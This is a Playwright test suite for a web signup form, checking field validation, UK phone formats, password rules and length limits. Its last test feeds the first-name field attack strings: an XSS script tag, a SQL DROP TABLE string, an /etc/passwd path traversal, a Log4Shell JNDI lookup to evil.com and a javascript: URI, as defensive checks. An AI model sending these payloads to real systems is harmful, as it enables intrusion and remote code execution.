import { test, expect } from '@playwright/test';
import { SignupPage } from '../../page-objects/auth/signup.page';
import { faker } from '@faker-js/faker';
import { generateUKPhoneNumber } from '../../utils/phone-number';
import { generateValidPassword, INVALID_PASSWORD_EXAMPLES } from '../../utils/password';

test.describe('Signup Page - Chrome Only', () => {
    let signupPage: SignupPage;

    test.beforeEach(async ({ page }) => {
        signupPage = new SignupPage(page);
        await signupPage.goto();
    });

    test.describe('Positive Tests', () => {
        test('should successfully create a new account and navigate to dashboard', async () => {
            const testData = {
                firstName: faker.person.firstName(),
                lastName: faker.person.lastName(),
                email: faker.internet.email(),
                companyName: faker.company.name(),
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };

            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            
            // Verify successful navigation to dashboard
            await signupPage.expectSuccessfulSignup();
        });

        test('should accept maximum length characters in all fields (255 chars)', async () => {
            const maxLengthString = 'A'.repeat(255);  // 255 characters
            const testData = {
                firstName: maxLengthString,
                lastName: maxLengthString,
                email: `${'test'.repeat(60)}@example.com`, // 255 char email
                companyName: maxLengthString,
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };

            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectSuccessfulSignup();
        });

        test('should accept valid UK mobile phone numbers', async () => {
            const testData = {
                firstName: faker.person.firstName(),
                lastName: faker.person.lastName(),
                email: faker.internet.email(),
                companyName: faker.company.name(),
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };

            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectSuccessfulSignup();
        });

        test('should accept valid UK landline phone numbers', async () => {
            const testData = {
                firstName: faker.person.firstName(),
                lastName: faker.person.lastName(),
                email: faker.internet.email(),
                companyName: faker.company.name(),
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('landline'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };

            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectSuccessfulSignup();
        });
    });

    test.describe('Negative Tests - Required Field Validation', () => {
        test('should show validation errors for all empty required fields', async () => {
            await signupPage.submitForm();
            
            await signupPage.expectValidationError(signupPage.firstNameInput, 'Please enter your first name');
            await signupPage.expectValidationError(signupPage.lastNameInput, 'Please enter your last name');
            await signupPage.expectValidationError(signupPage.emailInput, 'Please enter a valid email address');
            await signupPage.expectValidationError(signupPage.companyNameInput, 'Please enter the name of your company');
            await signupPage.expectValidationError(signupPage.phoneInput, 'Please enter a valid phone number');
            await signupPage.expectValidationError(signupPage.passwordInput, 'Please enter a valid password');
        });

        test('should reject invalid email formats', async ({ page }) => {
            const invalidEmails = [
                'invalid-email',
                '@example.com',
                'user@',
                'user.example.com',
                'user@@example.com',
                'user@.com',
                'user@example.',
                ' user@example.com',
                'user@example.com ',
                'user@ex ample.com'
            ];

            for (const invalidEmail of invalidEmails) {
                await signupPage.goto(); // Refresh page for each test
                
                const testData = {
                    firstName: faker.person.firstName(),
                    lastName: faker.person.lastName(),
                    email: invalidEmail,
                    companyName: faker.company.name(),
                    employeeCount: '11-20',
                    phone: generateUKPhoneNumber('mobile'),
                    password: generateValidPassword(),
                    hearAbout: 'Search Engine'
                };

                await signupPage.fillSignupForm(testData);
                await signupPage.submitForm();
                await signupPage.expectValidationError(
                    signupPage.emailInput,
                    'Please enter a valid email address'
                );
            }
        });

        test('should reject invalid UK phone number formats', async () => {
            const invalidPhoneNumbers = [
                '12345',                    // Too short
                '+447123456789',           // Should not have +44
                '7123456789',              // Missing leading 0
                '08123456789',             // Invalid UK prefix  
                '01234',                   // Too short
                '07123',                   // Too short mobile
                '071234567890',            // Too long
                '07!@#$%^&*()',           // Invalid characters
                '00123456789',             // Invalid prefix
                '03123456789',             // Invalid prefix
                '04123456789',             // Invalid prefix
                '05123456789',             // Invalid prefix
                '06123456789',             // Invalid prefix
                '08123456789',             // Invalid prefix
                '09123456789'              // Invalid prefix
            ];

            for (const invalidPhone of invalidPhoneNumbers) {
                await signupPage.goto(); // Refresh page for each test
                
                const testData = {
                    firstName: faker.person.firstName(),
                    lastName: faker.person.lastName(),
                    email: faker.internet.email(),
                    companyName: faker.company.name(),
                    employeeCount: '11-20',
                    phone: invalidPhone,
                    password: generateValidPassword(),
                    hearAbout: 'Search Engine'
                };

                await signupPage.fillSignupForm(testData);
                await signupPage.submitForm();
                await signupPage.expectValidationError(
                    signupPage.phoneInput,
                    'Please enter a valid phone number'
                );
            }
        });

        test('should validate password requirements with specific error messages', async () => {
            // Test each invalid password scenario
            for (const [scenario, invalidPassword] of Object.entries(INVALID_PASSWORD_EXAMPLES)) {
                await signupPage.goto(); // Refresh page for each test
                
                const testData = {
                    firstName: faker.person.firstName(),
                    lastName: faker.person.lastName(),
                    email: faker.internet.email(),
                    companyName: faker.company.name(),
                    employeeCount: '11-20',
                    phone: generateUKPhoneNumber('mobile'),
                    password: invalidPassword,
                    hearAbout: 'Search Engine'
                };

                await signupPage.fillSignupForm(testData);
                await signupPage.submitForm();
                
                // Different error messages based on the scenario
                const errorMessage = scenario === 'tooShort' 
                    ? 'Your password should be at least 8 characters'
                    : 'Your password should include 1 uppercase letter, 1 lowercase letter, and 1 number';
                    
                await signupPage.expectValidationError(
                    signupPage.passwordInput,
                    errorMessage
                );
            }
        });
    });

    test.describe('Parameter-Based Tests - Field Limits', () => {
        test('should reject fields exceeding 255 characters', async () => {
            const exceededLengthString = 'A'.repeat(256);  // 256 characters - exceeds limit
            
            // Test First Name field limit
            await signupPage.goto();
            let testData = {
                firstName: exceededLengthString,
                lastName: faker.person.lastName(),
                email: faker.internet.email(),
                companyName: faker.company.name(),
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };
            
            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectValidationError(
                signupPage.firstNameInput,
                'First name must not exceed 255 characters'
            );

            // Test Last Name field limit
            await signupPage.goto();
            testData = {
                firstName: faker.person.firstName(),
                lastName: exceededLengthString,
                email: faker.internet.email(),
                companyName: faker.company.name(),
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };
            
            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectValidationError(
                signupPage.lastNameInput,
                'Last name must not exceed 255 characters'
            );

            // Test Company Name field limit
            await signupPage.goto();
            testData = {
                firstName: faker.person.firstName(),
                lastName: faker.person.lastName(),
                email: faker.internet.email(),
                companyName: exceededLengthString,
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };
            
            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectValidationError(
                signupPage.companyNameInput,
                'Company name must not exceed 255 characters'
            );
        });

        test('should accept exactly 255 characters in text fields', async () => {
            const exactLengthString = 'A'.repeat(255);  // Exactly 255 characters
            
            const testData = {
                firstName: exactLengthString,
                lastName: exactLengthString,
                email: `${'test'.repeat(60)}@example.com`, // Valid long email
                companyName: exactLengthString,
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };

            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectSuccessfulSignup();
        });

        test('should validate field lengths at boundary conditions', async () => {
            // Test 254 characters (just under limit)
            const almostMaxString = 'A'.repeat(254);
            
            const testData = {
                firstName: almostMaxString,
                lastName: almostMaxString,
                email: faker.internet.email(),
                companyName: almostMaxString,
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };

            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectSuccessfulSignup();
        });
    });

    test.describe('Edge Cases and Special Characters', () => {
        test('should handle special characters in name fields', async () => {
            const testData = {
                firstName: "O'Connor-Smith",
                lastName: "van der Berg",
                email: faker.internet.email(),
                companyName: "Smith & Associates Ltd.",
                employeeCount: '11-20',
                phone: generateUKPhoneNumber('mobile'),
                password: generateValidPassword(),
                hearAbout: 'Search Engine'
            };

            await signupPage.fillSignupForm(testData);
            await signupPage.submitForm();
            await signupPage.expectSuccessfulSignup();
        });

        test('should reject malicious input attempts', async () => {
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                'DROP TABLE users;',
                '../../etc/passwd',
                '${jndi:ldap://evil.com/a}',
                'javascript:alert(1)'
            ];

            for (const maliciousInput of maliciousInputs) {
                await signupPage.goto();
                
                const testData = {
                    firstName: maliciousInput,
                    lastName: faker.person.lastName(),
                    email: faker.internet.email(),
                    companyName: faker.company.name(),
                    employeeCount: '11-20',
                    phone: generateUKPhoneNumber('mobile'),
                    password: generateValidPassword(),
                    hearAbout: 'Search Engine'
                };

                await signupPage.fillSignupForm(testData);
                await signupPage.submitForm();
                
                // Should either sanitize the input and succeed, or show validation error
                // This test ensures the app doesn't crash or execute malicious code
                await expect(signupPage.page).not.toHaveURL(/.*error.*/);
            }
        });
    });
}); 